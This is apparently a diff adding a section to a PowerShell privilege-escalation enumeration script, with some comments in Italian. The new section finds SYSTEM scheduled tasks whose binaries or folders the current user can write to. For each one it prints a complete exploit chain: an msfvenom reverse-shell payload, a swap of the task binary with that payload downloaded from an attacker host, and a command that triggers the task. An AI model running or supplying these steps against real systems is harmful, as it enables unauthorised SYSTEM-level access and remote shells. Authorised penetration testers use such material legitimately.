@@ -576,6 +576,7 @@ foreach($task in $tasks) {
     }
 }
 
+
 # ==========================================
 # SCHEDULED TASKS - INTERESTING USERS
 # ==========================================
@@ -633,4 +634,94 @@ if($interestingTasks.Count -gt 0) {
     Write-Host "    - Controlla con: net user <username> /domain" -F Gray
 } else {
     Write-Host "[*] No tasks running as custom/domain users found" -F DarkGray
+}
+
+# ==========================================
+# SCHEDULED TASKS - SYSTEM IN NON-STANDARD PATHS
+# ==========================================
+Write-Host "`n============================================" -F Yellow
+Write-Host "  [4c/4] SYSTEM Tasks in Non-Standard Paths" -F Yellow
+Write-Host "============================================" -F Yellow
+
+$systemTasks = schtasks /query /fo CSV /v 2>$null | ConvertFrom-Csv | Where-Object {
+    $_."Scheduled Task State" -eq "Enabled" -and
+    $_."Run As User" -match '(SYSTEM|LocalSystem)' -and
+    $_."Task To Run" -and
+    $_."Task To Run" -notmatch '^COM handler|^Multiple Actions' -and
+    $_."Task To Run" -notmatch '^C:\\Windows\\' -and
+    $_."Task To Run" -notmatch '^C:\\Program Files\\' -and
+    $_."Task To Run" -notmatch '^C:\\Program Files \(x86\)\\' -and
+    $_."Task To Run" -notmatch '^%windir%' -and
+    $_."Task To Run" -notmatch '^%systemroot%' -and
+    $_."Task To Run" -notmatch '^%ProgramFiles%'
+}
+
+if($systemTasks.Count -gt 0) {
+    Write-Host "`n[!] Found $($systemTasks.Count) SYSTEM tasks in non-standard paths:" -F Cyan
+    
+    foreach($task in $systemTasks) {
+        $taskRaw = $task."Task To Run"
+        
+        # Espandi variabili d'ambiente
+        $taskExpanded = [Environment]::ExpandEnvironmentVariables($taskRaw)
+        
+        $taskPath = if($taskExpanded -match '^"([^"]+)"') {
+            $matches[1]
+        } elseif($taskExpanded -match '^([a-zA-Z]:\\[^\s]+\.\w+)') {
+            $matches[1]
+        } else {
+            $taskExpanded.Split()[0]
+        }
+        $taskDir = Split-Path $taskPath -Parent
+        
+        # Check esistenza e permessi
+        $binExists = Test-Path $taskPath -EA 0
+        $dirExists = Test-Path $taskDir -EA 0
+        
+        # Mostra solo se esiste qualcosa da controllare
+        if($binExists -or $dirExists) {
+            $binWritable = $false
+            $dirWritable = $false
+            
+            if($binExists) {
+                $binAcl = icacls $taskPath 2>$null | Out-String
+                if(Test-WritableAcl $binAcl $meEscaped $groups) { $binWritable = $true }
+            }
+            
+            if($dirExists) {
+                $dirAcl = icacls $taskDir 2>$null | Out-String
+                if(Test-WritableAcl $dirAcl $meEscaped $groups) { $dirWritable = $true }
+            }
+            
+            # Mostra solo se vulnerabile
+            if($binWritable -or $dirWritable) {
+                Write-Host "`n========================================" -F Cyan
+                Write-Host "[!] VULNERABLE SYSTEM TASK: $($task.TaskName)" -F Red
+                Write-Host "========================================" -F Cyan
+                Write-Host "    Run As: $($task.'Run As User')" -F Red
+                Write-Host "    Command: $taskRaw" -F Gray
+                Write-Host "    Binary: $taskPath"
+                Write-Host "    Directory: $taskDir"
+                
+                if($binWritable) {
+                    Write-Host "`n[+] BINARY WRITABLE - PRIVESC TO SYSTEM!" -F Red
+                    Show-Perms $binAcl $meEscaped
+                }
+                
+                if($dirWritable) {
+                    Write-Host "`n[+] DIR WRITABLE - DLL HIJACK TO SYSTEM!" -F Yellow
+                    Show-Perms $dirAcl $meEscaped
+                }
+                
+                Write-Host "`n[*] EXPLOIT:" -F Magenta
+                $fname = [System.IO.Path]::GetFileName($taskPath)
+                Write-Host "    msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f exe -o $fname" -F Gray
+                Write-Host "    move `"$taskPath`" `"$taskPath.bak`"" -F Gray
+                Write-Host "    iwr -Uri http://IP/$fname -OutFile `"$taskPath`"" -F Gray
+                Write-Host "    schtasks /run /tn `"$($task.TaskName)`"" -F Gray
+            }
+        }
+    }
+} else {
+    Write-Host "[*] No SYSTEM tasks in non-standard paths found" -F DarkGray
 }
